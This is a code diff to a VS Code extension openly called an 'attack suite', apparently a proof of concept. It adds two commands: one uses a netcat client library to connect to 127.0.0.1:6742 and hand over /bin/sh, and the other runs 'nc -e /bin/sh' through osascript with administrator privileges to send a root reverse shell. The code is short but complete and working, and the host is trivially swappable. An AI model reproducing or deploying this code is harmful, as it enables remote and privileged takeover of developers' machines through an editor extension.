@@ -1,28 +1,37 @@
-// The module 'vscode' contains the VS Code extensibility API
-// Import the module and reference it with the alias vscode in your code below
 import * as vscode from 'vscode';
-const NETCAT_CLIENT = require('netcat/client');
-const nc = new NETCAT_CLIENT();
+const { exec } = require('child_process');
+const netcatClient = require('netcat/client');
 
-// This method is called when your extension is activated
-// Your extension is activated the very first time the command is executed
+const nc = new netcatClient();
+
+const ip = '127.0.0.1';
+const port = 6742;
+
 export function activate(context: vscode.ExtensionContext) {
 
-	// Use the console to output diagnostic information (console.log) and errors (console.error)
-	// This line of code will only be executed once when your extension is activated
 	console.log('Attack suite running');
 
-	// The command has been defined in the package.json file
-	// Now provide the implementation of the command with registerCommand
-	// The commandId parameter must match the command field in package.json
 	let disposable = vscode.commands.registerCommand('attack-suite.reverseShell', () => {
-		// The code you place here will be executed every time your command is executed
-		// Display a message box to the user
-		nc.addr('127.0.0.1').port(6742).retry(5000).connect().exec('/bin/sh');
+		nc.addr(ip).port(port).retry(5000).connect().exec('/bin/sh');
 		vscode.window.showInformationMessage('Reverse shell sent');
 	});
 
 	context.subscriptions.push(disposable);
+
+	disposable = vscode.commands.registerCommand('attack-suite.reverseRootShell', async () => {
+
+		const payload = `nc -e /bin/sh ${ip} ${port}`;
+
+		const script = `do shell script "${payload}" with administrator privileges`;
+
+		const {stdout} = await exec('osascript -e \'' + script + '\'');
+
+		//nc.addr(ip).port(port).retry(5000).connect().exec('sudo /bin/sh');
+		vscode.window.showInformationMessage('Root shell sent');
+	});
+
+	context.subscriptions.push(disposable);
+
 }
 
 // This method is called when your extension is deactivated
